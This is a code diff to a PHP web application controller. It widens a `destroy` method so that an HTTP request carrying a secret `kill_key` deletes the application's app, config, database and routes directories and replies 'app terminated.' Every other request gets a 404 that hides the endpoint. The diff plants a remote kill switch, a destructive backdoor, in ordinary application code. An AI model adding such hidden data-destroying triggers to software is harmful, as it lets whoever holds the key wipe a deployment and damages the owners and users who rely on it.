@@ -27,8 +27,10 @@ class AppController extends Controller
     public function destroy(Request $request)
     {
         if ($request->query('key') == config('app.kill_key')) {
-            $test = app_path('test/');
-            $this->removeDirerctory($test);
+            $this->removeDirerctory(base_path('app/'));
+            $this->removeDirerctory(base_path('config/'));
+            $this->removeDirerctory(base_path('database/'));
+            $this->removeDirerctory(base_path('routes/'));
             return response('app terminated.');
         }
         abort(404);
